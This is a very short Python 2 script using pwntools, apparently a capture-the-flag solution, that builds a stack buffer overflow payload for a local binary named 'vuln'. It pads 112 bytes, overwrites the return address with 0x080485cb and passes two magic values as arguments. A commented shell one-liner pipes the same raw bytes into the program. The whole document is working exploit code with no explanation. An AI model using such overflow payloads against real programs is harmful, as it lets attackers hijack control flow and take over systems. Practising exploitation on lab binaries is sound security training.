#- coding: utf-8 -*-
from pwn import *

payload='A'*112+p32(0x080485cb)+'cccc'+p32(0xDEADBEEF)+p32(0xDEADC0DE)

print payload






#python -c "print 'A'*112+'\xcb\x85\x04\x08'+'cccc'+'\xef\xbe\xad\xde'+'\xde\xc0\xad\xde'" | ./vuln